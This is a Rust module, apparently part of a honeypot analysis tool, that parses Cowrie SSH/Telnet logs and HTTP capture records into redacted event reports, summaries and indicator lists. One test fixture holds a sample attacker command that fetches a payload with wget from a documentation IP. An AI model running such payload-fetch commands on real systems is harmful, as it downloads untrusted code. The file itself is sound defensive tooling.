use crate::{display, evidence::{open_readonly, validate_http_metadata}, OutputFormat, Trace};
use sha2::{Digest, Sha256};
use anyhow::Result;
use chrono::{DateTime, SecondsFormat, Utc};
use regex::Regex;
use serde_json::{json, Value};
use std::{collections::{BTreeMap, BTreeSet, HashSet}, fs::{self, File}, io::{BufRead, BufReader, Read, Seek, SeekFrom}, net::IpAddr, path::Path, time::Duration};

const MAX_LINE: usize = 1024 * 1024;
const RETAINED_BYTES: usize = 16 * 1024 * 1024;

#[derive(Default)]
struct Warnings { messages: BTreeSet<String>, overflow: bool }
impl Warnings {
    fn push(&mut self, warning: String) {
        if self.messages.len() < 256 { self.messages.insert(warning); }
        else { self.overflow = true; }
    }
    fn into_vec(mut self) -> Vec<String> {
        if self.overflow { self.messages.insert("Warning limit reached; additional coverage errors omitted".into()); }
        self.messages.into_iter().collect()
    }
}

pub fn timestamp(value: &str) -> std::result::Result<String, String> {
    DateTime::parse_from_rfc3339(value).map(|d| d.with_timezone(&Utc).to_rfc3339_opts(SecondsFormat::Nanos,true)).map_err(|e|e.to_string())
}

fn redact(obj: &mut Value) {
    match obj {
        Value::Object(map) => for (key, value) in map {
            if matches!(key.to_ascii_lowercase().as_str(), "password"|"passwd"|"authorization"|"cookie") {
                *value=json!("[redacted]");
            } else if key == "message" {
                // Cowrie human messages repeat plaintext credentials.
                *value=json!("[omitted; inspect original evidence]");
            } else { redact(value); }
        },
        Value::Array(array) => for value in array { redact(value); },
        _ => {},
    }
}

fn http_events(path: &Path, limit: u32, warnings: &mut Warnings) -> Vec<Value> {
    let result = (|| -> Result<Vec<Value>> {
        let db = open_readonly(path)?;
        let mut stmt = db.prepare("SELECT id,time,peer,CASE WHEN length(metadata)<=1048576 THEN metadata ELSE NULL END,raw_file,raw_sha256,raw_bytes FROM events ORDER BY time DESC,id DESC LIMIT ?")?;
        let rows = stmt.query_map([limit + 1], |r| Ok((r.get::<_,String>(0)?,r.get::<_,String>(1)?,r.get::<_,String>(2)?,r.get::<_,Option<String>>(3)?,r.get::<_,String>(4)?,r.get::<_,String>(5)?,r.get::<_,i64>(6)?)))?;
        let mut events = Vec::new();
        let mut retained_bytes = 0usize;
        for row in rows {
            if events.len() >= limit as usize { warnings.push("HTTP event limit reached; older events excluded".into()); break; }
            let (id,time,peer,meta,file,hash,size) = row?;
            let parsed = (|| -> Result<Value> {
                let meta: Value = serde_json::from_str(meta.as_deref().ok_or_else(||anyhow::anyhow!("oversized HTTP metadata"))?)?;
                anyhow::ensure!(meta.is_object(), "metadata is not an object");
                let peer: Value = serde_json::from_str(&peer)?;
                validate_http_metadata(&meta, &peer)?;
                let stamp = timestamp(&time).map_err(anyhow::Error::msg)?;
                Ok(json!({"id":id,"time":stamp,"protocol":if meta["tls"]==true {"https"} else {"http"},
                    "src_ip":peer[0],"session":null,"event":"http.request","method":meta["method"],
                    "target":meta["target"],"signals":meta["signals"],"complete":meta["complete"],
                    "error":meta["error"],"bytes":size,"raw_file":file,"sha256":hash}))
            })();
            match parsed {
                Ok(event) => {
                    let bytes = serde_json::to_vec(&event)?.len();
                    if retained_bytes.saturating_add(bytes) > RETAINED_BYTES {
                        warnings.push("HTTP retained-byte limit reached; older events excluded".into());
                        break;
                    }
                    retained_bytes += bytes;
                    events.push(event);
                },
                Err(_) => warnings.push(format!("Malformed or oversized HTTP record: {id}")),
            }
        }
        Ok(events)
    })();
    match result { Ok(events)=>events, Err(error)=> { warnings.push(format!("HTTP evidence unavailable: {error}"));Vec::new() } }
}

// Read one whole record with a bounded allocation, even when hostile logs have
// multi-megabyte lines. Discard oversize tails and preserve accurate file offsets.
fn bounded_line(reader: &mut impl BufRead) -> std::io::Result<(Vec<u8>, usize, bool)> {
    let mut line=Vec::new(); let mut consumed=0; let mut oversized=false;
    loop {
        let buffer=reader.fill_buf()?;
        if buffer.is_empty() { return Ok((line,consumed,oversized)); }
        let n=buffer.iter().position(|b| *b==b'\n').map(|n|n+1).unwrap_or(buffer.len());
        if !oversized && line.len().saturating_add(n)<=MAX_LINE { line.extend_from_slice(&buffer[..n]); }
        else { oversized=true; line.clear(); }
        let ended=buffer[n-1]==b'\n';
        reader.consume(n); consumed+=n;
        if ended { return Ok((line,consumed,oversized)); }
    }
}

fn cowrie_log_name(name: &str) -> bool {
    name == "cowrie.json" || name.strip_prefix("cowrie.json.").is_some_and(|tail| {
        let tail = tail.strip_suffix(".gz").unwrap_or(tail);
        !tail.is_empty() && tail.bytes().all(|b| b.is_ascii_digit() || b == b'-')
    })
}

fn cowrie_events(args: &Trace, warnings: &mut Warnings) -> Vec<Value> {
    let folder=args.cowrie.join("log/cowrie");
    let entries=match fs::read_dir(&folder) {
        Ok(entries)=>entries,
        Err(error)=> { warnings.push(format!("Cowrie evidence unavailable: {error}"));return Vec::new(); }
    };
    let mut files=Vec::new();
    for entry in entries {
        match entry {
            Ok(entry) if cowrie_log_name(&entry.file_name().to_string_lossy()) => {
                match entry.metadata() {
                    Ok(meta) if meta.is_file()=>files.push((meta.modified().ok(),entry.path())),
                    _=>warnings.push("Cowrie log metadata unavailable or not a file".into()),
                }
            },
            Err(error)=>warnings.push(format!("Cowrie directory entry unavailable: {error}")),
            _=>{},
        }
    }
    files.sort_by(|a,b|b.cmp(a));
    if files.is_empty() { warnings.push("Cowrie JSON logs absent; SSH/Telnet coverage unknown".into()); }
    if files.len()>args.max_files as usize { warnings.push("Cowrie file limit reached; older rotations excluded".into()); }
    // A BTreeMap drops the oldest retained event with no full-sort per line.
    let mut events=BTreeMap::<(String,String),(usize,Value)>::new();
    let mut sources=BTreeMap::<String,BTreeSet<String>>::new();
    let mut protocols=BTreeMap::<String,BTreeSet<String>>::new();
    let mut retained=0usize;
    let mut cut=false;
    let mut remaining_bytes=64u64 * 1024 * 1024;
    for (_,path) in files.into_iter().take(args.max_files as usize) {
        if remaining_bytes == 0 {warnings.push("Cowrie total read-byte limit reached; older files excluded".into());break;}
        let name=path.file_name().unwrap_or_default().to_string_lossy().to_string();
        if path.extension().is_some_and(|v|v=="gz") { warnings.push(format!("Compressed Cowrie rotation excluded: {name}"));continue; }
        let result=(|| -> Result<()> {
            anyhow::ensure!(!path.symlink_metadata()?.file_type().is_symlink(),"symlink log refused");
            let mut file=File::open(&path)?;
            let size=file.metadata()?.len();
            let start=size.saturating_sub(u64::from(args.max_log_bytes).min(remaining_bytes));
            remaining_bytes = remaining_bytes.saturating_sub(size-start);
            let mut line_boundary = true;
            if start > 0 {
                file.seek(SeekFrom::Start(start-1))?;
                let mut previous = [0u8];
                file.read_exact(&mut previous)?;
                line_boundary = previous[0] == b'\n';
            }
            file.seek(SeekFrom::Start(start))?;
            let mut reader=BufReader::new(file.take(size-start));
            let mut offset=start;
            if start>0 {
                warnings.push(format!("Cowrie file truncated to bounded tail: {name}"));
                if !line_boundary {offset+=bounded_line(&mut reader)?.1 as u64;}
            }
            // A file can grow concurrently: don't follow it indefinitely.
            while offset<size {
                let at=offset;
                let (line,n,oversized)=bounded_line(&mut reader)?;
                offset+=n as u64;
                if n==0 { break; }
                if oversized { warnings.push(format!("Oversized Cowrie line skipped: {name}"));continue; }
                if !line.ends_with(b"\n") { warnings.push(format!("Partial final Cowrie line skipped: {name}"));continue; }
                let parsed=(|| -> Result<Value> {
                    let obj:Value=serde_json::from_slice(&line)?;
                    anyhow::ensure!(obj.is_object(),"not an object");
                    for key in ["session","src_ip","protocol"] {
                        anyhow::ensure!(obj[key].is_null()||obj[key].is_string(),"invalid Cowrie schema");
                    }
                    anyhow::ensure!(obj["session"].as_str().is_none_or(|s| !s.is_empty() && s.len() <= 128), "invalid session identifier");
                    anyhow::ensure!(obj["src_ip"].as_str().is_none_or(|s| s.parse::<IpAddr>().is_ok()), "invalid source address");
                    let stamp=timestamp(obj["timestamp"].as_str().ok_or_else(||anyhow::anyhow!("missing timestamp"))?).map_err(anyhow::Error::msg)?;
                    let event=obj["eventid"].as_str().ok_or_else(||anyhow::anyhow!("missing eventid"))?;
                    let protocol=match obj["protocol"].as_str() { Some("ssh")=>"ssh",Some("telnet")=>"telnet",_=>"cowrie_unknown" };
                    Ok(json!({"id":format!("cowrie:{name}:{at}:{:x}", Sha256::digest(&line)),"time":stamp,"protocol":protocol,
                        "src_ip":obj["src_ip"],"session":obj["session"],"event":event,
                        "evidence_file":name,"evidence_offset":at,"details":obj}))
                })();
                let event=match parsed { Ok(event)=>event,Err(_)=> { warnings.push(format!("Malformed Cowrie event skipped: {name}:{at}"));continue; } };
                if let Some(session)=event["session"].as_str() {
                    if sources.len()<10000 || sources.contains_key(session) {
                        let ips = sources.entry(session.to_owned()).or_default();
                        if let Some(ip)=event["src_ip"].as_str() {
                            // Two distinct sources suffice to flag ambiguity.
                            if ips.len() < 2 {ips.insert(ip.to_owned());}
                        }
                        if let Some(protocol @ ("ssh"|"telnet"))=event["protocol"].as_str() { protocols.entry(session.to_owned()).or_default().insert(protocol.to_owned()); }
                    } else { warnings.push("Cowrie session-source index limit reached".into()); }
                }
                events.insert((event["time"].as_str().unwrap_or_default().to_owned(),event["id"].as_str().unwrap_or_default().to_owned()),(line.len(),event));
                retained+=line.len();
                while events.len()>args.limit as usize || retained>RETAINED_BYTES {
                    if let Some((_,(bytes,_)))=events.pop_first() {retained=retained.saturating_sub(bytes);cut=true;}
                }
            }
            Ok(())
        })();
        if let Err(error)=result {warnings.push(format!("Cowrie file unavailable: {name}: {error}"));}
    }
    if cut {warnings.push("Cowrie event/retained-byte limit reached; older events excluded".into());}
    events.into_values().map(|(_,mut event)| {
        if let Some(session)=event["session"].as_str().map(str::to_owned) {
            if let Some(ips)=sources.get(&session) {
                if ips.len()>1 {event["source_conflict"]=json!(true);}
                if event["src_ip"].is_null() && ips.len()==1 {
                    event["src_ip"]=json!(ips.first());event["source_inferred_from_session"]=json!(true);
                }
            }
            if event["protocol"]=="cowrie_unknown" {
                if let Some(protocols)=protocols.get(&session) {
                    if protocols.len()==1 {event["protocol"]=json!(protocols.first());event["protocol_inferred_from_session"]=json!(true);}
                }
            }
        }
        event
    }).collect()
}

fn increment(counts: &mut BTreeMap<String,usize>,key: &str) { *counts.entry(key.to_owned()).or_default()+=1; }
fn summaries(events: &[Value]) -> Value {
    let mut sessions=BTreeMap::<String,Value>::new();
    let mut commands=BTreeMap::new(); let mut sources=BTreeMap::new(); let mut kinds=BTreeMap::new();
    for event in events {
        if let Some(ip)=event["src_ip"].as_str() { increment(&mut sources,ip); }
        let kind=event["event"].as_str().unwrap_or("unknown"); increment(&mut kinds,kind);
        if kind=="cowrie.command.input" { if let Some(command)=event["details"]["input"].as_str() { increment(&mut commands,command); } }
        let Some(id)=event["session"].as_str() else {continue;};
        let session=sessions.entry(id.to_owned()).or_insert_with(||json!({"session":id,"protocol":event["protocol"],"src_ip":event["src_ip"],
            "first_observed":event["time"],"last_observed":event["time"],"closed":false,"duration_seconds":null,
            "logins":[],"commands":[],"recordings":[],"artifacts":[],"client_versions":[]}));
        session["last_observed"]=event["time"].clone();
        if session["src_ip"].is_null() {session["src_ip"]=event["src_ip"].clone();}
        if event["source_conflict"]==true {session["source_conflict"]=json!(true);}
        let detail=&event["details"];
        let item=match kind {
            "cowrie.login.success"|"cowrie.login.failed"=>Some(("logins",json!({"time":event["time"],"event":kind,"username":detail["username"],"password":detail["password"],"evidence_id":event["id"]}))),
            "cowrie.command.input"=>Some(("commands",json!({"time":event["time"],"input":detail["input"],"evidence_id":event["id"]}))),
            "cowrie.log.closed"=>Some(("recordings",json!({"ttylog":detail["ttylog"],"duration":detail["duration"],"evidence_id":event["id"]}))),
            "cowrie.session.file_download"|"cowrie.session.file_upload"|"cowrie.session.file_download.failed"=>Some(("artifacts",json!({"event":kind,"url":detail["url"],"outfile":detail["outfile"],"shasum":detail["shasum"],"evidence_id":event["id"]}))),
            "cowrie.client.version"=>Some(("client_versions",json!({"version":detail["version"],"evidence_id":event["id"]}))),
            "cowrie.session.closed"=> {
                session["closed"]=json!(true);
                session["duration_seconds"]=if let Some(ms)=detail["duration_ms"].as_f64() {json!(ms/1000.0)} else {detail["duration"].clone()};None
            },
            _=>None,
        };
        if let Some((key,value))=item { if let Some(list)=session[key].as_array_mut() {list.push(value);} }
    }
    json!({"scope":"filtered retained events only; session beginnings/endings may be absent",
        "event_types":kinds,"source_events":sources,"command_counts":commands,"sessions":sessions.into_values().collect::<Vec<_>>()})
}

fn indicators(events: &[Value]) -> Value {
    let urls=Regex::new(r#"(?:https?|ftp)://[^\s<>\x00-\x1f\x7f\"']+"#).expect("constant regex");
    let ips=Regex::new(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b").expect("constant regex");
    let mut found=BTreeMap::<(String,String),BTreeSet<String>>::new();
    for event in events {
        for field in [&event["target"],&event["details"]["input"],&event["details"]["url"]].iter().filter_map(|v|v.as_str()) {
            let id=event["id"].as_str().unwrap_or_default().to_owned();
            for value in urls.find_iter(field) {found.entry(("url".into(),value.as_str().into())).or_default().insert(id.clone());}
            for value in ips.find_iter(field) {
                if value.as_str().parse::<IpAddr>().is_ok() {found.entry(("ipv4".into(),value.as_str().into())).or_default().insert(id.clone());}
            }
        }
    }
    json!(found.into_iter().map(|((kind,value),ids)|json!({"type":kind,"value":value,"evidence_ids":ids})).collect::<Vec<_>>())
}

pub fn snapshot(args: &Trace) -> Value {
    let mut warnings=Warnings::default();
    let mut events=http_events(&args.http,args.limit,&mut warnings);
    if let Some(path) = &args.https { events.extend(http_events(path,args.limit,&mut warnings)); }
    events.extend(cowrie_events(args,&mut warnings));
    events.retain(|e| args.ip.as_ref().is_none_or(|ip|e["src_ip"].as_str().and_then(|s|s.parse::<IpAddr>().ok())==Some(*ip))
        && args.session.as_ref().is_none_or(|s|e["session"].as_str()==Some(s.as_str()))
        && args.since.as_ref().is_none_or(|s|e["time"].as_str().is_some_and(|t|t>=s.as_str())));
    events.sort_by(|a,b|a["time"].as_str().cmp(&b["time"].as_str()).then(a["id"].as_str().cmp(&b["id"].as_str())));
    if events.len()>args.limit as usize {events.drain(..events.len()-args.limit as usize);warnings.push("Combined event limit reached".into());}
    let mut protocols=BTreeMap::new();
    for event in &events {increment(&mut protocols,event["protocol"].as_str().unwrap_or("unknown"));}
    let warnings=warnings.into_vec();
    let mut result=json!({"observed_at":Utc::now().to_rfc3339(),"coverage":if warnings.is_empty(){"available_files_within_limits"}else{"partial"},
        "warnings":warnings,"event_count":events.len(),"protocols":protocols,
        "correlation":"Same source IP and timing only; not attribution or proof of PHP exploitation."});
    if args.summary {result["summary"]=summaries(&events);}
    if args.indicators {result["indicators"]=indicators(&events);}
    result["events"]=json!(events);
    if !args.show_credentials {redact(&mut result);}
    result
}

pub async fn run(args: Trace) -> Result<()> {
    if !args.follow {
        let report = snapshot(&args);
        match args.format {
            OutputFormat::Json => println!("{}", serde_json::to_string_pretty(&report)?),
            OutputFormat::Text => print!("{}", display::report(&report)),
        }
        return Ok(());
    }
    let mut seen=HashSet::<String>::new();
    loop {
        let report=snapshot(&args);
        match args.format {
            OutputFormat::Json => println!("{}",json!({"type":"coverage","observed_at":report["observed_at"],"coverage":report["coverage"],"warnings":report["warnings"]})),
            OutputFormat::Text => print!("{}", display::coverage(&report)),
        }
        let mut current=HashSet::new();
        if let Some(events)=report["events"].as_array() {
            for event in events {
                let id=event["id"].as_str().unwrap_or_default().to_owned();
                if !seen.contains(&id) {
                    match args.format {
                        OutputFormat::Json => println!("{event}"),
                        OutputFormat::Text => println!("{}", display::event(event)),
                    }
                }
                current.insert(id);
            }
        }
        seen=current;
        tokio::select! { _=tokio::signal::ctrl_c()=>break, _=tokio::time::sleep(Duration::from_secs(2))=>{} }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::Store;
    use std::io::Write;
    fn args(root: &Path) -> Trace {
        Trace {http:root.join("http"),cowrie:root.join("cowrie"),https:None,ip:None,session:None,since:None,limit:100,
            max_log_bytes:100000,max_files:8,indicators:true,show_credentials:false,summary:true,follow:false,format:OutputFormat::Json}
    }
    fn logs(root: &Path, events: &[Value]) {
        let folder=root.join("cowrie/log/cowrie");fs::create_dir_all(&folder).unwrap();
        let mut file=File::create(folder.join("cowrie.json")).unwrap();
        for event in events {writeln!(file,"{event}").unwrap();}
    }
    fn event(kind: &str) -> Value {json!({"timestamp":"2026-10-21T19:00:00Z","session":"test-session","eventid":kind})}
    #[test]
    fn normalizes_time_and_requires_zone() {
        assert!(timestamp("2026-10-21T19:00:00").is_err());
        assert_eq!(timestamp("2026-10-21T12:00:00-07:00"),timestamp("2026-10-21T19:00:00Z"));
    }
    #[test]
    fn correlates_telnet_and_redacts_repeated_passwords() {
        let root=tempfile::tempdir().unwrap(); let a=args(root.path());
        let _store=Store::new(&a.http,1000000).unwrap();
        let mut connect=event("cowrie.session.connect");connect["src_ip"]=json!("198.51.100.7");connect["protocol"]=json!("telnet");
        let mut login=event("cowrie.login.success");login["username"]=json!("root");login["password"]=json!("synthetic-test-password");login["message"]=json!("password=synthetic-test-password");
        let mut command=event("cowrie.command.input");command["input"]=json!("wget http://203.0.113.5/payload");
        logs(root.path(),&[connect,login,command]);
        let report=snapshot(&a);
        assert_eq!(report["protocols"]["telnet"],3);
        assert!(!report.to_string().contains("synthetic-test-password"));
        assert_eq!(report["summary"]["sessions"][0]["commands"][0]["input"],"wget http://203.0.113.5/payload");
        assert_eq!(report["indicators"].as_array().unwrap().len(),2);
        assert_eq!(report["coverage"],"available_files_within_limits");
    }
    #[test]
    fn missing_sources_and_malformed_lines_are_partial() {
        let root=tempfile::tempdir().unwrap();let a=args(root.path());
        assert_eq!(snapshot(&a)["coverage"],"partial");
        logs(root.path(),&[json!({"session":[]})]);
        let report=snapshot(&a);assert_eq!(report["event_count"],0);assert!(report["warnings"].as_array().unwrap().len()>=2);
    }
    #[test]
    fn conflicting_sources_never_fill_missing_ip() {
        let root=tempfile::tempdir().unwrap();let a=args(root.path());
        let mut first=event("cowrie.session.connect");first["src_ip"]=json!("198.51.100.7");
        let mut second=first.clone();second["src_ip"]=json!("198.51.100.8");
        logs(root.path(),&[first,second,event("cowrie.command.input")]);
        let report=snapshot(&a);
        let command=report["events"].as_array().unwrap().iter().find(|e|e["event"]=="cowrie.command.input").unwrap();
        assert!(command["src_ip"].is_null());assert_eq!(command["source_conflict"],true);
    }
    #[test]
    fn file_tail_event_limits_and_explicit_credentials() {
        let root=tempfile::tempdir().unwrap();let mut a=args(root.path());
        let mut login=event("cowrie.login.success");login["password"]=json!("synthetic-test-password");
        logs(root.path(),&[login.clone(),login.clone(),login]);
        a.limit=1;a.show_credentials=true;
        let report=snapshot(&a);assert_eq!(report["event_count"],1);assert!(report.to_string().contains("synthetic-test-password"));
        assert!(report["warnings"].as_array().unwrap().iter().any(|w|w.as_str().unwrap().contains("limit")));
        a.max_log_bytes=50;assert_eq!(snapshot(&a)["event_count"],0);
    }
    #[test]
    fn oversized_lines_do_not_allocate_unbounded_memory() {
        let mut bytes=vec![b'x';MAX_LINE+100];bytes.extend_from_slice(b"\n{}\n");
        let mut reader=BufReader::new(bytes.as_slice());
        let (line,n,oversized)=bounded_line(&mut reader).unwrap();
        assert!(oversized);assert!(line.is_empty());assert_eq!(n,MAX_LINE+101);
        assert_eq!(bounded_line(&mut reader).unwrap().0,b"{}\n");
    }
    #[test]
    fn tail_at_record_boundary_retains_first_complete_event() {
        let root=tempfile::tempdir().unwrap();let mut a=args(root.path());
        logs(root.path(), &[event("cowrie.login.failed"),event("cowrie.command.input")]);
        let file=root.path().join("cowrie/log/cowrie/cowrie.json");
        let bytes=fs::read(file).unwrap();
        let boundary=bytes.iter().position(|b|*b==b'\n').unwrap()+1;
        a.max_log_bytes=(bytes.len()-boundary) as u32;
        let report=snapshot(&a);
        assert_eq!(report["event_count"],1);
        assert_eq!(report["events"][0]["event"],"cowrie.command.input");
    }
    #[test]
    fn ignores_backups_and_changes_identity_when_same_offset_is_replaced() {
        let root=tempfile::tempdir().unwrap();let a=args(root.path());
        logs(root.path(), &[event("cowrie.login.failed")]);
        let first=snapshot(&a)["events"][0]["id"].clone();
        let folder=root.path().join("cowrie/log/cowrie");
        fs::copy(folder.join("cowrie.json"),folder.join("cowrie.json.bak")).unwrap();
        logs(root.path(), &[event("cowrie.login.success")]);
        let report=snapshot(&a);
        assert_eq!(report["event_count"],1);
        assert_ne!(report["events"][0]["id"],first);
        assert!(cowrie_log_name("cowrie.json.2026-10-21"));
        assert!(cowrie_log_name("cowrie.json.1"));
        assert!(!cowrie_log_name("cowrie.json.bak"));
    }
    #[test]
    fn malformed_http_endpoint_is_reported_as_unknown_coverage() {
        let root=tempfile::tempdir().unwrap();let a=args(root.path());
        let mut store=Store::new(&a.http,1000000).unwrap();
        store.save(b"GET / HTTP/1.1\r\n\r\n",&json!({"complete":true}),json!(["invalid-address",42]),json!(null)).unwrap();
        let report=snapshot(&a);
        assert_eq!(report["event_count"],0);
        assert!(report["warnings"].as_array().unwrap().iter().any(|w|w.as_str().unwrap().contains("Malformed or oversized HTTP")));
    }

}
